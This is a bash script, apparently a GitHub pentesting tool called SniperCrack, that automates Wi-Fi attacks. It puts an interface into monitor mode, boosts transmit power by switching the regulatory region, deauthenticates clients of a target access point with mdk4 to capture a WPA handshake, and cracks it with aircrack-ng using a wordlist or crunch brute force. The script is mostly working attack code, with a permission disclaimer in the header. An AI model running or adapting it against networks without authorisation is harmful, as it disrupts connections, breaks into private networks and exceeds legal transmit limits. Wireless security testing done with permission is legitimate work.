#!/bin/bash

# Title: SniperCrack wifi pentesting
# Version: 1.0
# Contact: hwac121@protonmail.com

# URL: http://www.majikcat.com
# GitHub: https://github.com/hwac121/Snatch.git

#-----------------------------------------------------------------

# Description:
# Snatch is used to find, choose, and snatch a handshake from a network
# AP and it's connecting client. Do not use on a network without
# explicit permission as this would be illegal. This software was
# designed strictly for pentesting and educational purposes only.
# The author is not responsible for any abuse of this program by the
# end-user.

#=======================================================================
#                          FUNCTIONS
#=======================================================================

splash(){
	echo -e " "
	figlet "SniperCrack"
	sleep 0.15
	echo -e "==============================================================="                                           
	echo -e "\e[30mVersion 1.0\e[0m"
	echo -e " "
	echo -e "\e[36mPlease Note: You will need to either [Scan for Target] or [Set WiFi Interface] to begin.\e[0m"
}

credits(){
	echo -e " "
	echo -e "			███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█" 
	sleep 0.15
	echo -e "			████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█"
	sleep 0.15
	echo -e "			███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█" 
	sleep 0.15
	echo -e "			███▓▓▓▓▓▓▓╬╬▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			████▓▓▓╬╬╬╬▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██" 
	sleep 0.15
	echo -e "			█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██" 
	sleep 0.15
	echo -e "			████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██" 
	sleep 0.15
	echo -e "			████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██" 
	sleep 0.15
	echo -e "			█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██" 
	sleep 0.15
	echo -e "			█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███" 
	sleep 0.15
	echo -e "			██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███" 
	sleep 0.15
	echo -e "			███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████" 
	sleep 0.15
	echo -e "			███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████" 
	sleep 0.15
	echo -e "			████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████" 
	sleep 0.15
	echo -e "			█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████" 
	sleep 0.15
	echo -e "			██████████▓▓▓█▓▓▓╬▓██╬╬╬╬╬╬╬╬╬╬╬▓███████" 
	sleep 0.15
	echo -e "			███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████" 
	sleep 0.15
	echo -e "			██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████" 
	sleep 0.15
	echo -e "			███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████"
	sleep 0.15
	echo -e " "
	echo -e "\e[35mCreated November 2022\e[0m"
	sleep 0.15
	echo -e " "
	echo -e "\e[35mGitHub: https://github.com/hwac121\e[0m"
	sleep 0.15
	echo -e "\e[35meMail: hwac121@protonmail.com\e[0m"
	sleep 0.15
	echo -e " "
	echo -e "\e[35mThis program utilizes mdk4, aircrack-ng, TX Power Blast v3, wash, and crunch.\e[0m"
	sleep 3.0
}


StartMonitor() {
		echo -e "\e[37mKilling background apps that could cause issues...\e[0m"
		sudo airmon-ng check kill
		sleep 0.25
		echo -e "\e[37mStarting $wlan in monitor mode\e[0m"
		sudo airmon-ng start $wlan
        sleep 1.5
        echo -e "\e[37mProcess complete!\e[0m"
        sleep 1.5
}

StopMonitor(){
		echo -e "\e[37mTaking $lanmon out of monitor MODE\e[0m"
		echo -e " "
		echo -e "\e[37mBringing down interface...\e[0m"
		sudo ifconfig $wlan down
		sleep 0.15
		echo -e " "
		echo -e "\e[37mSetting mode to managed\e[0m"
		sudo iwconfig $wlan mode managed
		sleep 0.15
		echo -e " "
		echo -e "\e[37mBringing interface back up...\e[0m"
		sudo ifconfig $wlan up
		sleep 0.15
		echo -e " "
		echo -e "\e[37mStopping monitor mode...\e[0m"
		sudo airmon-ng stop $lanmon
		sleep 0.15
}

BoostInterface(){
	echo -e "\e[37mBoosting $twlan now...\e[0m"
	echo -e " "
	sleep 1.5
	echo -e "\e[37mTaking down $wlan for changes\e[0m"
	sudo ifconfig $wlan down
	echo -e " "
	sleep 0.25
	echo -e "\e[37mResetting region to open up range\e[0m"
	sudo iw reg set GY
	echo -e " "
	sleep 0.25
	echo -e "\e[37mBringing $wlan back up\e[0m"
	sudo ifconfig $wlan up
	echo -e " "
	sleep 0.25
	echo -e "\e[37mRaising TX Power to 30db\e[0m"
	sudo iwconfig $wlan txpower 30
	echo -e " "
	sleep 0.25
	echo -e "\e[37mTX Power Blast boost is complete!\e[0m"
	sleep 1.5
}

ReturnIface(){
	echo -e "\e[37mTaking WiFi Interface to normal mode\e[0m"
	sudo ip link set $wlan down
	echo -e " "
	sleep 0.15
	echo -e "\e[37mBringing down interface...\e[0m"
	sudo iw reg set US
	echo -e " "
	sleep 0.15
	echo -e "\e[37mResetting transmit power to normal...\e[0m"
	sudo iwconfig $wlan txpower 20
	echo -e " "
	sleep 0.15
	echo -e "\e[37mSetting interface back to managed\e[0m"
	sudo iw $wlan set type managed
	echo -e " "
	sleep 0.15
	echo -e "\e[37mBringing interface back up...\e[0m"
	sudo ip link set $wlan up
	echo -e " "
	sleep 0.15
	echo -e "\e[37mWiFi Interface back to normal!\e[0m"
	sleep 1.5
}

SetChan(){
	echo -e "\e[37mWhat is the channel change?\e[0m"
	read chan
	sudo iwconfig $wlan channel $chan
	sleep 0.5
	echo -e " "
	echo -e "\e[37mChannel on $wlan now changed to $chan\e[0m"
}

ReadHelp(){
	sudo mate-terminal -hold -e cat README.nfo 
}


ResetNetMan(){
	echo -e "\e[37mAttempting to restart the Network Manager...\e[0m"
	sudo service network-manager restart
}

AttackMode(){
	echo -e "\e[37mBeginning attack!\e[0m"
	sudo mate-terminal -hold -e airodump-ng --bssid $bssid $lanmon &
	sudo iwconfig $wlan channel $chan
	sudo mate-terminal -hold -e mdk4 $lanmon d -B $bssid -c $chan
	echo -e "\e[37mWhen you see a handshake appear Ctrl+c and close the terminal popup window.\e[0m"
	echo -e "\e[37mA *.cap file will be saved in the SniperCrack folder.\e[0m"
}

#=======================================================================
#                        CHECK FOR ROOT
#=======================================================================

if [ "$EUID" -ne 0 ]
  then 
	clear
	splash
	echo "\e[31mPlease run as root or sudo ./SniperCrack directly from the folder or sudo snipercrack anywhere in a terminal\e[0m"
	sleep 0.5
  exit
fi

#=======================================================================
#                         BEGIN MENU
#=======================================================================

options=( "Scan for Target" "Attack Target" "View WiFi Interfaces" "View TX Power" "Set New Channel" "Set/Reset WiFi Interface" "Set to Managed MODE" "Restart Network Manager" "Remove TX Boost" "Crack Password" "Crack Password - Special" "Credits" "Help" "Quit")
PS3='Choose what action to take: '
while [ "$menu" != 1 ]; do
	clear
	splash
	echo -e " "
	sleep 0.25
	select opt in "${options[@]}"; do
    	case $opt in 
    	
#=======================================================================
#                        SCAN FOR TARGET
#=======================================================================

		"Scan for Target")
			clear
			splash
			echo -e "\e[37mChoose which wifi interface to use: (ie. wlan0)\e[0m"
			read wlan
			setmon="mon"
			lanmon="$wlan$setmon"
			BoostInterface
			echo -e "\e[37mSetting interface to monitor mode\e[0m"
			echo -e " "
			StartMonitor
			sleep 5.0
			echo -e "\e[37mStarting local area scan now...\e[0m"
			echo -e " "
			sleep 0.05
			echo -e "\e[37mOnce you have chosen a Target...\e[0m"
			echo -e "\e[37mSelect the small terminal popup window, enter [Ctrl+c], and close it to continue\e[0m"
			echo -e "\e[31mNOTE FIRST!:\e[0m \e[37mBe sure to copy down the bssid, essid, channel and station of the\e[0m"
			echo -e "\e[37mintended Target BEFORE closing the terminal popup window!\e[0m"
			sudo mate-terminal -hold -e airodump-ng $lanmon &
			sleep 3 
			clear
		break
		;;

#=======================================================================
#                           ATTACK TARGET
#=======================================================================

		"Attack Target")
			clear
			splash
			echo -e "\e[37mEnter the target's essid\e[0m"
			read essid
			echo -e " "
			echo -e "\e[37mEnter the target's bssid\e[0m"
			read bssid
			echo -e " "
			echo -e "\e[37mPlease enter target's station\e[0m"
			read station
			echo -e " "
			echo -e "\e[37mPlease enter the target's channel\e[0m"
			read chan
			echo -e " "
			AttackMode
		break
		;;

#=======================================================================
#                        VIEW WIFI INTERFACES
#=======================================================================

		"View WiFi Interfaces")
			clear
			splash
			echo -e " "
			echo -e "\e[33mWhen you are done, Ctrl+c and close the popup terminal to continue.\e[0m"
			sudo mate-terminal -hold -e airmon-ng &
		break
		;;

#=======================================================================
#                        VIEW TX POWER & MORE
#=======================================================================

		"View TX Power")
			clear
			splash
			echo -e " "
			echo -e "\e[33mWhen you are done, Ctrl+c and close the popup terminal to continue.\e[0m"
			sudo mate-terminal -hold -e iwconfig &
		break
		;;

#=======================================================================
#                          SET NEW CHANNEL
#=======================================================================

		"Set New Channel")
			clear
			Splash
			SetChan
			sleep 0.15
		break
		;;

#=======================================================================
#                   RESET WIFI CHOSEN INTERFACE
#=======================================================================
		
		"Set/Reset WiFi Interface")
			clear
			echo -e "\e[37mChoose a WiFi Interface\e[0m"
			read wlan
			setmon="mon"
			lanmon="$wlan$setmon"
			echo -e "\e[37mWiFi interface has been reset to $wlan\e[0m"
			sleep 2
		break
		;;

#=======================================================================
#                          SET TO MANAGED MODE
#=======================================================================

		"Set to Managed MODE")
			clear
			splash
			StopMonitor
			sleep 1.5
		break
		;;

#=======================================================================
#                  ATTEMPT TO RESET NETWORK MANAGER
#=======================================================================

		"Restart Network Manager")
			clear
			splash
			ResetNetMan
			sleep 1.5
		break
		;;

#=======================================================================
#                            REMOVE TX BOOST
#=======================================================================

		"Remove TX Boost")
			clear
			echo -e "\e[33mAttempting to reset TX Power Boost to normal...\e[0m"
			sleep 1.5
			echo -e " "
			ReturnIface
			echo -e " "
		break
		;;

#=======================================================================
#                       CRACK PASSWORD - SPECIAL
#=======================================================================
		
		"Crack Password - Special")
			clear
			splash
			echo -e "Enter the exact path to your *.cap file"
			echo -e "(ie. /home/charlie/exploits/SniperCrack/somenamehere.cap)"
			read capfile
			echo -e " "
			sleep 0.15
			echo -e "Enter the special characters you wish to use"
			echo -e "(ie. ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%)"
			read specialchars
			echo -e " "
			sleep 0.15
			echo -e "Enter minimum characters for password"
			echo -e "(ie. Use numbers 1-9)"
			read min
			sleep 0.15
			echo -e "Enter maximum characters for password"
			echo -e "(ie. Use numbers 1-9)"
			read max
			sleep 0.15
			sudo mate-terminal -hold -e aircrack-ng $capfile --bssid $bssid | crunch $min $max $specialchars -w-
			sleep 1.5
		break
		;;

#=======================================================================
#                            CRACK PASSWORD
#=======================================================================

		"Crack Password")
			clear
			splash
			echo -e "Please enter the path to your dictionary/wordlist file."
			read wordlist
			echo -e " "
			echo -e "Please enter the path to your hash/*.cap file."
			read capfile
			echo -e " "
			sudo mate-terminal -hold -e aircrack-ng $capfile -w $wordlist
			sleep 1.5
		break
		;;

#=======================================================================
#                               CREDITS
#=======================================================================

		"Credits")
			clear
			splash
			echo -e " "
			credits
			sleep 2
		break
		;;

#=======================================================================
#                                HELP
#=======================================================================

		"Help")
			clear
			splash
			ReadHelp
			sleep 1.5
		break
		;;

#=======================================================================
#                                QUIT
#=======================================================================

		"Quit")
			clear
			splash
			echo -e "Stopping monitor mode"
			sleep 0.15
			StopMonitor
			echo -e " "
			echo -e "Returning interface to Managed MODE"
			sleep 0.15
			ReturnIface
			echo -e " "
			echo -e "Restarting Network Manager"
			sleep 0.15
			ResetNetMan
			echo -e " "
			echo -e "Thank you for using Snatch v1.0 - Created June 2019"
			menu=1
			sleep 2
			clear
		break
		;;
	* )
			echo -e "$REPLY is an invalid option"
		break
		;;
    	esac
	done
done

exit 0
